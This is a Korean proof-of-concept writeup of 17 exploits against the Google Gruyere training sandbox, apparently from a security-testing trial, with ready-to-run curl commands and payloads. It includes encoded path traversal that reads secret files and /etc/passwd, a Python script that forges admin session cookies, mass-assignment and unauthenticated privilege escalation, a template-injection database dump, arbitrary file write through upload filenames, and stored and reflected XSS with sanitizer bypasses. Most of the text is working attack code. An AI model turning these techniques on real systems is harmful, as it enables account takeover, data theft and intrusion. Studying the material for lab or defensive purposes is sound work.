# PoC 코드 — google-gruyere-trial

대상: `https://google-gruyere.appspot.com/<gid>/` (GID=399820027374159079597995648128134925001)
전제: 프록시는 캡처용이며 공격에 필수 아님. 쿠키 jar(`gruyere.cookies`) 획득은 아래 0단계.
범위: phase 1(Round 1~5) + phase 2(Round 6~10) 전체. 각 항목은 **최소 재현 코드**만 담는다.

```bash
GID=399820027374159079597995648128134925001
B="https://google-gruyere.appspot.com/$GID"
```

---

## 0. 샌드박스(GID) 확보 — 모든 PoC 의 전제

```bash
curl -s -c gruyere.cookies "https://google-gruyere.appspot.com/start" -o start.html
GID=$(grep -oE 'Gruyere instance id is [0-9]+' start.html | grep -oE '[0-9]+')
curl -s -c gruyere.cookies -b gruyere.cookies -L "https://google-gruyere.appspot.com/$GID"
```

## 1. 무인증 전 사용자 자격증명 노출 (CRITICAL)

인증도 파라미터도 필요 없다. 요청 한 번.

```bash
curl -s "$B/dump.gtl"
```

응답 핵심:
```
_cookie: {'is_admin': False, 'is_author': False, 'uid': None}
_db: {'administrator': {'is_admin': True, 'pw': 'secret', ...},
      'cheddar': {'pw': 'orange', ...}, 'sardo': {'pw': 'odras', ...},
      'brie': {'pw': 'briebrie', ...}}
```
→ 전 계정 평문 비밀번호 + private_snippet + 관리자 플래그가 그대로 출력된다.

## 2. 무인증 관리자 페이지 노출 (HIGH)

```bash
curl -s "$B/manage.gtl" | grep -E "Manage this server|quitserver"
```
→ `Manage this server` 화면과 `/reset`, `/quitserver` 링크가 인증 없이 렌더된다.

## 3. 경로 이탈로 서버 시크릿·DB 탈취 (CRITICAL)

**핵심: 평문 `../` 는 프론트엔드가 302 로 제거하므로 슬래시까지 인코딩해야 한다.**

```bash
# 쿠키 서명 시크릿
curl -s --path-as-is "$B/%2e%2e%2fsecret.txt"
#   → Cookie!
# 서버 DB 픽클 파일(전 사용자 평문 비밀번호)
curl -s --path-as-is "$B/%2e%2e%2fstored-data.txt"
# 확장자 없는 파일도 허용됨
curl -s --path-as-is "$B/../README"
```
변형(동일 취약점, 다른 인코딩): `..%2f`, `%2e%2e/`는 차단, `%2e%2e%2f`·`..%2f` 는 통과.

## 4. 쿠키 서명 위조 → 인증 완전 우회 (CRITICAL)

3번으로 얻은 시크릿(`Cookie!\n`)과 아래 알고리즘으로 **임의 계정·임의 권한** 쿠키를 만든다.

```python
# Python 2.7 str.__hash__ 재현 (64bit 부호 wrap)
def py2_hash(s):
    if not s:
        return 0
    x = ord(s[0]) << 7
    for ch in s:
        x = ((1000003 * x) ^ ord(ch)) & ((1 << 64) - 1)
    x = (x ^ len(s)) & ((1 << 64) - 1)
    return x - (1 << 64) if x >= 1 << 63 else x

SECRET = "Cookie!\n"                       # = 서버 secret.txt
def mint(uid, admin=False, author=False):
    cdata = f"{uid}|{'admin' if admin else ''}|{'author' if author else ''}"
    return f"GRUYERE={py2_hash(SECRET + cdata) & 0x7FFFFFF}|{cdata}"
```

```bash
# 자격증명 없이 administrator 로 인식된다
curl -s -H "Cookie: GRUYERE=65692386|administrator|admin|author" "$B/dump.gtl"
#   → _cookie: {'is_admin': True, 'is_author': True, 'uid': u'administrator'}
```
검증(알고리즘 대조군, 실측값과 4/4 일치):
`brie||author`→74315992, `administrator|admin|`→31131337,
`cheddar||author`→40461140, `sardo||author`→22005508

## 5. 매스어사인먼트 권한 상승 (HIGH)

내 계정(brie)을 관리자로 승격. `is_admin` 이 요청 파라미터에서 프로필로 그대로 들어간다.

```bash
curl -s -c gruyere.cookies -b gruyere.cookies "$B/login?uid=brie&pw=briebrie"
curl -s -c gruyere.cookies -b gruyere.cookies \
  "$B/saveprofile?action=update&uid=brie&is_admin=True&name=Brie"
# 재로그인해야 쿠키에 반영된다(플래그는 로그인 시점에 샘플링됨)
curl -s -c gruyere.cookies -b gruyere.cookies -D - "$B/login?uid=brie&pw=briebrie" | grep -i set-cookie
#   → set-cookie: GRUYERE=72819616|brie|admin|author
curl -s -b gruyere.cookies "$B/dump.gtl"     # _cookie is_admin True
```

## 6. 저장형 XSS — 스니펫 (HIGH)

```bash
PAYLOAD='<img src=x-nonexistent.png onerror="document.body.setAttribute(\"data-x\",document.cookie)">'
curl -s -c gruyere.cookies -b gruyere.cookies \
  --get --data-urlencode "snippet=$PAYLOAD" "$B/newsnippet2"
# 비인증 방문자로 확인
curl -s "$B/"                        # <span id='brie'><img ... onerror="..."></span>
curl -s "$B/snippets.gtl?uid=brie"   # <div id='0'><img ... onerror="..."></div>
```

## 7. 저장형 XSS — 프로필 icon 속성 탈출 (HIGH)

`src='{{icon:text}}'` 에서 `cgi.escape` 가 따옴표를 이스케이프하지 않는다.

```bash
ICON="x' onerror='var d=document.createElement(\"div\");d.id=\"icon-xss\";document.body.appendChild(d)'"
curl -s -c gruyere.cookies -b gruyere.cookies \
  --get --data-urlencode "icon=$ICON" \
  "$B/saveprofile?action=update&uid=brie&name=Brie"
curl -s "$B/" | grep -o "<img alt=''[^>]*>"     # 속성 탈출된 img 태그
```

## 8. 반사형 XSS — 경로 반사 (MEDIUM)

```bash
curl -s --path-as-is "$B/x%3Cscript%3Edocument.title%3D%27PATH-XSS%27%3C/script%3E"
#   → <div class='message'>Invalid request: /x<script>document.title='PATH-XSS'</script></div>
```

## 9. 반사형 XSS — feed.gtl 의 uid (MEDIUM)

```bash
# (a) JS 문자열 문맥 — 앱의 lib.js _refresh() 가 eval() 하는 경로에서 실행
curl -s --get --data-urlencode 'uid=x"] , document.title=`FEED-XSS` , ["y' "$B/feed.gtl"
# (b) h2 HTML 문맥 — 로드만으로 실행
curl -s --get --data-urlencode 'uid=zzz<img src=x onerror="document.title=1">' "$B/snippets.gtl"
# (c) Refresh 링크 onclick 속성 문맥 — 버튼 클릭으로 실행(' 사용 금지: 속성이 먼저 끊김)
curl -s --get --data-urlencode 'uid=x");document.title=String.fromCharCode(65);void("' "$B/snippets.gtl"
```

## 10. 미처리 예외 메시지 노출 (LOW)

```bash
curl -s --path-as-is "$B/%2e%2e%2fdata.py%00.txt"
#   → Exception: file() argument 1 must be encoded string without null bytes, not str
```

---

# phase 2 (Round 6~10) — 신규 PoC

## 11. 업로드 파일명 경로이탈 → 임의 파일 쓰기 (CRITICAL)

`_ExtractFileFromRequest` 가 multipart filename 을 **정규화 없이** 그대로 쓰고,
`_DoUpload2` 가 `_Open('resources/<uid>/' + filename, 'wb')` 로 연다.

```bash
# (대상 A) 애플리케이션 루트에 임의 파일 생성
curl -s -x http://127.0.0.1:8080 --cacert ~/.mitmproxy/mitmproxy-ca-cert.pem \
  -b gruyere.cookies -F 'upload_file=@proof.txt;filename=../../r6_root_proof.txt' "$B/upload2"
curl -s --path-as-is "$B/%2e%2e%2fr6_root_proof.txt"        # ← 파일 내용이 반환됨

# (대상 B) 다른 계정의 업로드 디렉터리에 쓰기
curl -s -b gruyere.cookies -F 'upload_file=@proof.txt;filename=../cheddar/r6_probe.txt' "$B/upload2"
curl -s "$B/cheddar/r6_probe.txt"                            # ← 파일 내용이 반환됨

# 대조군 (없는 파일은 상태코드가 아니라 본문으로 판정할 것)
curl -s "$B/cheddar/zzz_absent.txt"                          # → Invalid request (200)
```
**주의(판정 함정)**: 존재하지 않는 정적 파일도 HTTP 200 + `Invalid request` 를 반환한다.
성공 판정은 `%{http_code}` 가 아니라 **본문 내용 비교**로 해야 한다.

## 12. 업로드한 `.html` 이 같은 출처에서 그대로 서빙 → 저장형 XSS (HIGH)

경로이탈이 **필요 없다**. 자기 계정 디렉터리에 `.html` 을 올리고 그 URL 을 피해자에게 보낸다.

```bash
cat > r6upload.html <<'EOF'
<html><body><script>
document.title='HTML-XSS';
var d=document.createElement('div'); d.id='xss-proof';
d.textContent='COOKIE='+document.cookie; document.body.appendChild(d);
</script></body></html>
EOF
curl -s -b gruyere.cookies -F 'upload_file=@r6upload.html;filename=r6upload.html' "$B/upload2"
# 로그인한 피해자가 이 URL 을 열면 실행된다:
#   $B/brie/r6upload.html      → document.title='HTML-XSS', #xss-proof 에 세션 쿠키
```
`.html`/`.htm`/`.js` 는 `RESOURCE_CONTENT_TYPES` 를 그대로 받아 서빙된다.

## 13. 업로드한 `.gtl` 이 서버 템플릿으로 렌더 → 비인증 전 DB 덤프 (CRITICAL)

`.gtl` 확장자는 정적 파일이 아니라 **서버 템플릿**으로 렌더된다
(`_SendFileResponse` → `if filename.endswith('.gtl'): _SendTemplateResponse(...)`).
따라서 **업로드 = 서버측 템플릿 주입**이다.

```bash
printf 'DBDUMP-START\n{{_db:pprint}}\nDBDUMP-END\n' > r7.gtl
curl -s -b gruyere.cookies -F 'upload_file=@r7.gtl;filename=r7.gtl' "$B/upload2"
# 쿠키 없이(비인증) 요청
curl -s "$B/brie/r7.gtl" | sed -n '/DBDUMP-START/,/DBDUMP-END/p'
#   → 전 계정 평문 pw·private_snippet·is_admin 플래그가 pprint 로 덤프됨
```
활용 가능한 특수값: `{{_db:pprint}}`, `{{_profile...}}`, `{{_cookie...}}`, `{{_params...}}`,
`[[for:]]`/`[[if:]]`, `{{x:*param}}`(파라미터로 필드명 지정).

## 14. GTL `include` 경로이탈 → 임의 파일 읽기 (CRITICAL)

`_ExpandInclude` 는 `fname = os.sep + filename.replace('/', os.sep)` → `open('resources' + fname)`
— **경로 정규화가 없다**. 게다가 include 는 **닫는 태그가 필수**다(`[[include:X]][[/include:X]]`).

```bash
cat > r7b.gtl <<'EOF'
INC1[[include:../secret.txt]][[/include:../secret.txt]]
INC2[[include:../data.py]][[/include:../data.py]]
INC3[[include:../../../../etc/passwd]][[/include:../../../../etc/passwd]]
EOF
curl -s -b gruyere.cookies -F 'upload_file=@r7b.gtl;filename=r7b.gtl' "$B/upload2"
curl -s "$B/brie/r7b.gtl"
#   → secret.txt('Cookie!') / data.py 원문 / 시스템 /etc/passwd 가 렌더된다
# 대조군: 같은 data.py 를 정적 경로로 읽으면 확장자 화이트리스트에 막힌다
curl -s --path-as-is "$B/%2e%2e%2fdata.py"      # → Unrecognized file type
```
→ **정적 서빙의 확장자 화이트리스트를 템플릿 include 가 우회한다**(같은 결함이 두 진입점에 중복).

## 15. 무인증 임의 계정 프로필 변경 / 권한 상승 (CRITICAL)

`_DoSaveprofile` 의 `action=update` 는 **`pw` 파라미터가 있을 때만** `oldpw`/admin 검사를 한다.
`pw` 를 주지 않으면 조건 `(newpw and ...)` 이 거짓이라 검사 자체가 실행되지 않는다.
그리고 `uid = self._GetParameter(params, 'uid', cookie[COOKIE_UID])` — **uid 는 파라미터 우선**.

```bash
# 쿠키를 전혀 주지 않는다 (-b/-c 없음)
curl -s -o /dev/null -w "%{http_code}\n" \
  "$B/saveprofile?action=update&uid=brie&private_snippet=NOAUTH-PROOF"
#   → 302 (성공)
# 검증: 덤프의 <pre> 블록을 ast.literal_eval 해서 계정별 필드 비교
curl -s "$B/dump.gtl"
# 원상 복구(같은 경로로 원래 값 재설정)
curl -s "$B/saveprofile?action=update&uid=brie&private_snippet=I%20use%20the%20same%20password%20for%20all%20my%20accounts."
```
무조건 반영되는 필드: `name`, `pw`, `is_author`, **`is_admin`**, `private_snippet`, `icon`,
`web_site`, `color` → **`is_admin=True` 를 쿠키 없이 지정하면 임의 계정이 관리자가 된다.**
(CSRF 는 이 발견에 흡수된다 — 쿠키가 애초에 필요 없으므로 SameSite 논의가 무의미.)

## 16. 쿠키 구분자 필드 주입 → 서버가 스스로 관리자 쿠키 발급 (CRITICAL)

```bash
# 가입 폼 하나. uid 에 | 를 URL 인코딩해 넣는다 (사용자 승인 후 실행한 항목)
curl -s -D - "$B/saveprofile?action=new&uid=r9poc%7Cadmin%7Cauthor&pw=r9pocpw%21"
#   → Set-Cookie: GRUYERE=<sig>|r9poc|admin|author||; path=/<gid>
# 서버가 그 쿠키를 어떻게 해석하는지 (읽기 전용)
curl -s -b "GRUYERE=<sig>|r9poc|admin|author||" "$B/dump.gtl" | grep -A2 "_cookie:"
#   → {'is_admin': True, 'is_author': True, 'uid': u'r9poc'}
curl -s -b "GRUYERE=<sig>|r9poc|admin|author||" "$B/manage.gtl" | grep -o "Manage this server"
#   → 관리자 전용 링크 렌더 (비인증은 "Sign in | Sign up" 만)
```
소스: `c_data = '%s|%s|%s' % (uid, is_admin, is_author)` 로 uid 를 검증 없이 이어붙이고,
파싱은 `values = cookie_data.split('|')` 후 `is_admin = values[1]=='admin'`.
**서명은 그 uid 포함 데이터로 정상 계산되므로 검증을 통과한다** — 시크릿 위조 불필요.
DB 대조: 계정 `'r9poc|admin|author'` 는 `is_admin=None`(권한 없음) — **권한은 쿠키에만 있다.**

## 17. XSS 살균기(sanitize.py) 우회 (HIGH)

`gtl.py:217` 의 `:html` escaper 만 `sanitize.SanitizeHtml()` 을 호출한다
(`home.gtl` 의 `{{snippets.0:html}}`/`{{_profile.private_snippet:html}}`, `feed.gtl`).

```bash
# (가) 살균기 자체를 오프라인 단위검사 — 방어 코드를 직접 실행해 비교
python3 -c "
import sys; sys.path.insert(0,'scratch/src'); import sanitize
for p in ['<img src=x onerror=alert(1)>',        # 블랙리스트 누락 → 원문 통과
          '<img src=x OnLoad=alert(1)>',         # 대소문자 변형 → 원문 통과
          '<img src=x onload=alert(1)>',         # 정확한 소문자만 → blocked 로 치환
          '<a href=\"javascript:alert(1)\">x</a>']:  # 허용 태그 + 스킴 미검증 → 통과
    print(repr(p), '→', repr(sanitize.SanitizeHtml(p)))
"
# (나) 실서버 저장형
A2='<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" OnLoad="document.title='"'"'R10-CASE-BYPASS'"'"'">'
curl -s -b gruyere.cookies -G --data-urlencode "snippet=$A2" "$B/newsnippet2"
curl -s "$B/feed.gtl?uid=brie" | grep -o "OnLoad=[^>]*"     # 원문 보존 확인
# (다) 브라우저로 로그인 없이 홈 접속 → document.title 이 페이로드 값으로 변경됨
```
| 입력 | 살균 결과 |
|---|---|
| `<img src=x onerror=alert(1)>` | 원문 그대로 (블랙리스트에 `onerror` 없음) |
| `<img src=x OnLoad=alert(1)>` | 원문 그대로 (`t.replace` 가 대소문자 구분) |
| `<img src=x onload=alert(1)>` | `<img src=x blocked=alert(1)>` |
| `<a href="javascript:alert(1)">x</a>` | 원문 그대로 (`a` 허용, 스킴 미검증) |

---

## 부록 — 판정 함정 모음 (재현 시 주의)

| 함정 | 대응 |
|---|---|
| 프록시 `-D -` 출력의 첫 줄이 `HTTP/1.1 200 Connection established` (CONNECT) | 실제 상태코드는 `-w "%{http_code}"` 로 받거나 마지막 HTTP 줄을 볼 것 |
| 존재하지 않는 정적 파일도 200 + `Invalid request` | 존재/성공 판정은 **본문 내용**으로 |
| `include` 는 닫는 태그 필수 | `[[include:X]][[/include:X]]` |
| 업로드 파일명의 `%2e%2e%2f` | 서버가 multipart filename 을 그대로 쓰므로 `../../` 를 직접 넣거나 인코딩 |
| `curl` 의 `../` 자동 정규화 | `--path-as-is` 필수 |
| `feed.gtl` 을 브라우저로 직접 열면 미실행 | 앱의 `_refresh()` eval 경로를 통해야 실행 |
| 속성 탈출 페이로드에 `'` 사용 | `onclick='...'` 처럼 단일인용부호 속성이면 `"` 만 쓸 것 |
